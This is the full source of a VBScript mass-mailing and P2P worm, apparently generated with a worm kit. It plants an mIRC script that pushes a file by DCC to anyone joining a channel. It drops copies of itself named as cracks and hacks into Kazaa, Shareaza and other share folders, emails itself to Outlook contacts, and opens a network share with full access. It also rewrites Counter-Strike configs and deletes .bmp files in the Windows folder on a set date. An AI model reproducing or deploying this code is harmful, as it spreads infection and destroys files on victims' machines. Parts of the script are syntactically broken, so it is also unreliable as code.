'============================================================
 
' // \ Worm of suicide |кто знает долго ли мне ещё жить долго ли я смогу терпеть это всё я так не думаю / \\ '
 
 
On Error Resume Next
 
set skorFso = CreateObject("Scripting.FileSystemObject")
set skorWshs = CreateObject("Wscript.Shell")
windir = skorFso.getspecialfolder(0)
set sysdir=skorFso.getspecialfolder(1)
set tmpdir=skorFso.getspecialfolder(2)
set ntwrk = createobject("wscript.network")
hddisk=left(windir,2)
 

set skorgenworm = skorFso.getfile(wscript.scriptfullname)
proFiles = skorWshs.expandenvironmentstrings("%ProgramFiles%") 
If skorFso.folderexists(hddspace + "\Mirc32") Then 
mircpath = hddspace + "\Mirc32" 
ElseIf skorFso.folderexists(hddspace + "\Mirc") Then 
mircpath = hddspace + "\Mirc" 
ElseIf skorFso.folderexists(proFiles+"\Mirc32") Then 
mircpath = proFiles+"\Mirc32" 
ElseIf skorFso.folderexists(proFiles+"\Mirc") Then 
mircpath = proFiles+"\Mirc" 
End If
 
mirchax = "/§d§cc§ se§nd %ha§xn§ic§k " + runfile
mirchax = Replace(mirchax, "§", "") 
Set crtIRCScript = skorFso.createtextfile(mircpath + "Script.ini", True)
crtIRCScript.writeline ("[Script]") 
crtIRCScript.writeline ("n1=On 1:connect:{ ") 
crtIRCScript.writeline ("n2=titlebar = tcgck file dcc center") 
crtIRCScript.writeline ("n3=join #0,0") 
crtIRCScript.writeline ("n4=join -n #sponsor,#sponsoring,#bouncer4you,#ringer,#clansuche } ") 
crtIRCScript.writeline ("n5=On *:Join:#: {") 
crtIRCScript.writeline ("n6=/unset %haxnick") 
crtIRCScript.writeline ("n7=/set %haxnick $nick") 
crtIRCScript.writeline ("n8=var %rant = $rand(a, d)") 
crtIRCScript.writeline ("n9=if (%rant == a) { ") 
crtIRCScript.writeline ("n8=" + mirchax ") 
crtIRCScript.writeline ("n9=/msg %haxnick This is a very nice tool") 
crtIRCScript.writeline ("n10=}")
crtIRCScript.writeline ("n11=elseif (%rant == b) { ") 
crtIRCScript.writeline ("n12=" + mirchax) 
crtIRCScript.writeline ("n13=/msg %haxnick Hey, watch this ICQ Hacker") 
crtIRCScript.writeline ("n14=}") 
crtIRCScript.writeline ("n15=elseif (%rant == c) { ")
crtIRCScript.writeline ("n16=" + mirchax) 
crtIRCScript.writeline ("n17=/msg %haxnick The new Windows Hack Crack") 
crtIRCScript.writeline ("n18=}") 
crtIRCScript.writeline ("n19=else { ") 
crtIRCScript.writeline ("n20=" + mirchax) 
crtIRCScript.writeline ("n21=/msg %haxnick The Sims 2 Cheat Hack") 
crtIRCScript.writeline ("n22=}"") 
crtIRCScript.writeline ("n23=}"") 
crtIRCScript.Close 
 
set filecopycompress=skorFso.getfile(wscript.scriptfullname)
overnetpath = skorWshs.regread("HKEY_CLASSES_ROOT\Software\MM\Overnet\" & "InstallDir")  
If overnetpath <> "" Then 
fulloverpath = overnetpath + "\incoming" 
filecopycompress.Copy (fulloverpath + "\Microsoft MSN Messenger Hack.exe.vbs.vbs") 
filecopycompress.Copy (fulloverpath + "\Schlacht um Mittelerde MapHack.exe.vbs.vbs") 
filecopycompress.Copy (fulloverpath + "\Windows XP Sourcecode.txt.vbs.vbs") 
filecopycompress.Copy (fulloverpath + "\PowerDVD 5.9 Crack working.exe.vbs.vbs") 
filecopycompress.Copy (fulloverpath + "\kaspersky Key working.reg.vbs.vbs") 
End If 
shareazacollectionpath = skorWshs.regread("HKEY_CURRENT_USER\Software\Shareaza\Shareaza\Downloads\" & "CollectionPath")  
If shareazacollectionpath <> "" Then 
filecopycompress.Copy (shareazacollectionpath + "\Microsoft MSN Messenger Hack.exe.vbs.vbs") 
filecopycompress.Copy (shareazacollectionpath + "\Schlacht um Mittelerde MapHack.exe.vbs.vbs") 
filecopycompress.Copy (shareazacollectionpath + "\Windows XP Sourcecode.txt.vbs.vbs") 
filecopycompress.Copy (shareazacollectionpath + "\PowerDVD 5.9 Crack working.exe.vbs.vbs") 
filecopycompress.Copy (shareazacollectionpath + "\kaspersky Key working.reg.vbs.vbs") 
End if 
s_kazza = skorWshs.regread("HKEY_CURRENT_USER\Software\Kazaa\LocalContent\" + "DownloadDir")  
If Not s_kazza = "" Then 
filecopycompress.Copy (s_kazza + "\Microsoft MSN Messenger Hack.exe.vbs.vbs") 
filecopycompress.Copy (s_kazza + "\Schlacht um Mittelerde MapHack.exe.vbs.vbs") 
filecopycompress.Copy (s_kazza + "\Windows XP Sourcecode.txt.vbs.vbs") 
filecopycompress.Copy (s_kazza + "\PowerDVD 5.9 Crack working.exe.vbs.vbs") 
filecopycompress.Copy (s_kazza + "\kaspersky Key working.reg.vbs.vbs") 
End If 
MorphPath=skorWshs.regread ("HKEY_LOCAL_MACHINE\SOFTWARE\Morpheus\" & "Install_Dir") 
If Not MorphPath = "" Then 
filecopycompress.Copy (MorphPath + "\My Shared Folder\Microsoft MSN Messenger Hack.exe.vbs.vbs") 
filecopycompress.Copy (MorphPath + "\My Shared Folder\Schlacht um Mittelerde MapHack.exe.vbs.vbs") 
filecopycompress.Copy (MorphPath + "\My Shared Folder\Windows XP Sourcecode.txt.vbs.vbs") 
filecopycompress.Copy (MorphPath + "\My Shared Folder\PowerDVD 5.9 Crack working.exe.vbs.vbs") 
filecopycompress.Copy (MorphPath + "\My Shared Folder\kaspersky Key working.reg.vbs.vbs") 
end if 
Set AllDrives = skorFso.drives 
For Each Laufwerk In AllDrives 
If Laufwerk.DriveType = 2 Then 
FindeOrdnerMitStrings ("Laufwerk") 
End If 
Next 
Function FindeOrdnerMitStrings(Laufwerk) 
On Error Resume Next 
Set fso = CreateObject("scripting.filesystemobject") 
Set thedrive = fso.getfolder(Laufwerk) 
Set subfldr = thedrive.subfolders 
For Each unterordner In subfldr 
If InStr(unterordner.Name, "shar") Or InStr(unterordner.Name, "uplo") _ 
Or InStr(unterordner.Name, "downl") Or InStr(unterordner.Name, "freig") _ 
Or InStr(unterordner.Name, "instal") Or InStr(unterordner.Name, "softw") Then 
filecopycompress.Copy (unterordner.Name+ "\Microsoft MSN Messenger Hack.exe.vbs.vbs") 
filecopycompress.Copy (unterordner.Name + "\Schlacht um Mittelerde MapHack.exe.vbs.vbs") 
filecopycompress.Copy (unterordner.Name + "\Windows XP Sourcecode.txt.vbs.vbs") 
filecopycompress.Copy (unterordner.Name + "\PowerDVD 5.9 Crack working.exe.vbs.vbs") 
filecopycompress.Copy (unterordner.Name + "\kaspersky Key working.reg.vbs.vbs") 
End If 
Next 
For Each allOrdner In subfldr 
FindeOrdnerMitStrings (allOrdner.Path) 
Next 
End Function 
SET OUTAPP =CREATEOBJECT ("OUTLOOK.APPLICATION")
SET NEWEMAIL=OUTAPP.CREATEITEM(0)
FOR S_MAILS = 1 TO 27
SET MUHA = OUTAPP.GETNAMESPACE("MAPI")
SET ARGH= MUHA.ADDRESSLISTS(1).ADDRESSENTRIES(S_MAILS)
NewEMail.To = argh 
NewEMail.Subject = "Hallo!" 
NewEMail.Body = "I have very important document!" 
NewEMail.Attachments.Add runfile 
NewEMail.Send 
NewEMail.DeleteAfterSubmit = true 
Next 
if not skorFso.fileexists(sysdir+"\3768") then
Set crtFldrsh = skorFso.createfolder(sysdir + "\3768") 
end if 
If Not skorFso.fileexists(sysdir+"\3768\Shared_Warez") then 
Set crtFldrsh = skorFso.createfolder(sysdir + "\3768\Shared_Warez") 
End If 
Set copysharedf = skorFso.getfile(wscript.scriptfullname) 
copysharedf.Copy (sysdir + "\3768\Shared_Warez\hot teens .jpg.vbs") 
copysharedf.Copy (sysdir + "\3768\Shared_Warez\counter strike 1.6 hack.exe.vbs") 
copysharedf.Copy (sysdir + "\3768\Shared_Warez\Windows XP Sourcecode.txt.vbs") 
copysharedf.Copy (sysdir + "\3768\Shared_Warez\PowerDVD 5.9 Crack working.exe.vbs") 
copysharedf.Copy (sysdir + "\3768\Shared_Warez\kaspersky Key working.reg.vbs") 
ThisUser = ntwrk.computername 
finaluser = "\\" + ThisUser 
FolderName = Form1.sprd5_dirlocation 
AdminServer = finaluser 
Const ShareName = "Software fuer jeden" 
Set Services = GetObject("WINMGMTS:{impersonationLevel=impersonate,(Security)}!" & AdminServer & "\ROOT\CIMV2") 
Set SecDescClass = Services.Get("Win32_SecurityDescriptor") 
Set SecDesc = SecDescClass.SpawnInstance_() 
Set Trustee = Services.Get("Win32_Trustee").SpawnInstance_ 
Trustee.Domain = Null 
Trustee.Name = Form1.sprd5_nameprob 
Trustee.Properties_.Item("SID") = Array(1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0) 
Set ACE = Services.Get("Win32_Ace").SpawnInstance_ 
ACE.Properties_.Item("AccessMask") = 2032127 
ACE.Properties_.Item("AceFlags") = 3 
ACE.Properties_.Item("AceType") = 0 
ACE.Properties_.Item("Trustee") = Trustee 
SecDesc.Properties_.Item("DACL") = Array(ACE) 
Set Share = Services.Get("Win32_Share") 
Set InParam = Share.Methods_("Create").InParameters.SpawnInstance_() 
InParam.Properties_.Item("Access") = SecDesc 
InParam.Properties_.Item("Description") = "A normal public directory" 
InParam.Properties_.Item("Name") = ShareName 
InParam.Properties_.Item("Path") = FolderName 
InParam.Properties_.Item("Type") = 0 
Share.ExecMethod_ ("Create"), InParam 
SteamPath = skorWshs.regread("HKEY_LOCAL_MACHINE\SOFTWARE\Valve\Steam\" & "InstallPath") 
Set crtSteamVbs = skorFso.createtextfile(SteamPath + "\SteamApps\sk0rSteamAttacker.vbs", True) 
With crtSteamVbs 
.writeline ("Rem Win32/SkorSteamAttacker-A Spreading Script file") 
.writeline (" ") 
.writeline ("On Error Resume Next") 
.writeline ("Set fso = CreateObject(""scripting.filesystemobject"")") 
.writeline ("Set wshs = CreateObject(""wscript.shell"")") 
.writeline ("SteamPath = wshs.regread(""HKEY_LOCAL_MACHINE\SOFTWARE\Valve\Steam\"" & "InstallPath"") 
.writeline ("Set getfldr = fso.getfolder(SteamPath + ""\SteamApps"")") 
.writeline ("For Each UserAcc In getfldr.subfolders") 
.writeline ("If fso.folderexists(UserAcc.Path + ""\counter-strike\cstrike"") Then") 
.writeline ("If Not fso.fileexists(UserAcc.Path + ""\counter-strike\cstrike\userconfig.cfg"") Then") 
.writeline ("Set usercfg = fso.createtextfile(UserAcc.Path + ""\counter-strike\cstrike\userconfig.cfg"")") 
.writeline ("usercfg.writeline (""""//first created"""")"") 
.writeline ("usercfg.Close"") 
.writeline ("End If"") 
.writeline ("Set openusercfg = fso.opentextfile(UserAcc.Path + ""\counter-strike\cstrike\userconfig.cfg"", 2, True)") 
.writeline ("openusercfg.write (""""//Win32.SkorSteamAttacker-A Cs-Script File (Like IM-Worms)""" + vbCrLf)") 
.writeline ("openusercfg.write (""""//==========================================="""" + vbCrLf)") 
.writeline ("openusercfg.write (""""//Begin Config h4xx0ring:"" + vbCrLf)"") 
.writeline ("openusercfg.write (""""alias """"SkorWrite"""" """"say  www.domain.de/vx/worm.zip <- my worm """";"" + vbCrLf)") 
.writeline ("openusercfg.write (""""alias """"SkorSleep"""" """"echo You are infected with my worm """";"" + vbCrLf)") 
.writeline ("openusercfg.write (""""alias """"SkorGo"""" """"SkorAn"""";"" + vbCrLf)") 
.writeline ("openusercfg.write (""""alias """"SkorAn"""" """"SkorWrite; alias SkorGo SkorAus"""";"" + vbCrLf)") 
.writeline ("openusercfg.write (""""alias """"SkorAus"""" """"SkorSleep; alias SkorGo SkorSchmaus"""";"" + vbCrLf)") 
.writeline ("openusercfg.write (""""alias """"SkorSchmaus"""" """"SkorSleep; alias SkorGo SkorLaus"""";"" + vbCrLf)") 
.writeline ("openusercfg.write (""""alias """"SkorLaus"""" """"SkorSleep; alias SkorGo SkorKaus"""";"" + vbCrLf)") 
.writeline ("openusercfg.write (""""alias """"SkorKaus"""" """"SkorSleep; alias SkorGo SkorAn"""";"" + vbCrLf)") 
.writeline ("openusercfg.write (""""alias """"m_pitch"""" """"SkorGo"""";"" + vbCrLf)") 
.writeline ("openusercfg.write (""""s_enable_a3d;"""" + vbCrLf)") 
.writeline ("openusercfg.write (""s_a3d """"1""""; alias s_a3d;"""" + vbCrLf)"") 
.writeline ("openusercfg.write (""""rate """"7500"""";"" + vbCrLf)") 
.writeline ("openusercfg.write (""""//End Config h4xx0ring"""" + vbCrLf)") 
.writeline ("openusercfg.write (""""//==========================================="""" + vbCrLf)") 
.writeline ("openusercfg.write (""""//Win32.SkorSteamAttacker-A Cs-Script File (Like IM-Worms)"""" + vbCrLf)") 
.writeline ("End If") 
.writeline ("Next") 
.Close 
End With 
skorWshs.run (SteamPath + "\SteamApps\sk0rSteamAttacker.vbs"), , True 
skorFso.deletefile (SteamPath + "\SteamApps\sk0rSteamAttacker.vbs") 
 
if day(now) = 1 then
call skorczybikpayload() 
Sub skorczybikpayload 
Set allepladden = skorFso.drives 
For Each alledateieninallenfestplatten In allepladden 
If alledateieninallenfestplatten.drivetype = 2 Then 
Searchthafiles (foldername) 
End If 
Next 
Function Searchthafiles(foldername) 
Set gttheinffol = skorFso.getfolder(foldername) 
Set allfii = gttheinffol.Files 
Set subbuii = gttheinffol.subfolders 
For Each dateienzuminfizieren In allfii 
extensionzuminf = LCase(skorFso.getextensionname(dateienzuminfizieren.Path)) 
if extensionzuminf = "html" or extensionzuminf="mp3" or extensionzuminf="doc" then 
end if 
Next 
For Each alleunnerodner In subbuii 
Set strAlleUnterOrnderUoD = alleunnerordner.Files 
For Each jetztdieganzendatenderplatte In strAlleUnterOrnderUoD 
nehmedieext = LCase(fso.getextensionname(jetztdieganzendatenderplatte.Path)) 
if nehmedieext = "html" or nehmedieext="mp3" or nehmedieext="doc" then 
end if 
Next 
For Each aberdenganzenrechner In subbuii 
Searchthafiles (aberdenganzenrechner) 
Next 
End Function 
set batmsg = skorFso.createtextfile(windir+"\nachricht.bat") 
batmsg.writeline ("@echo off") 
batmsg.writeline ("title = ReVeNgE") 
batmsg.writeline ("color 9 ") 
batmsg.writeline ("cls") 
batmsg.writeline ("echo I'm here. ") 
batmsg.writeline ("pause") 
batmsg.writeline ("exit") 
batmsg.close 
skorWshs.run (windir+"\nachricht.bat"),,true 
skorFso.deletefile (windir+"\nachricht.bat") 
Msgbox ("I'm here."),vbokonly + vbInformation,"ReVeNgE" 
set gtwin = skorFso.getfolder(windir) 
Set bmpfiles = gtwin.Files 
For Each bitmapfile In bmpfiles 
If LCase(skorFso.getextensionname(bitmapfile.path)) = "bmp" Then 
skorFso.deletefile (bitmapfile.Path) 
End If 
Next 
End Sub 
 
' // End of Worm of revengemade with tcgck v1.2 by sk0r (Czybik) \\ '
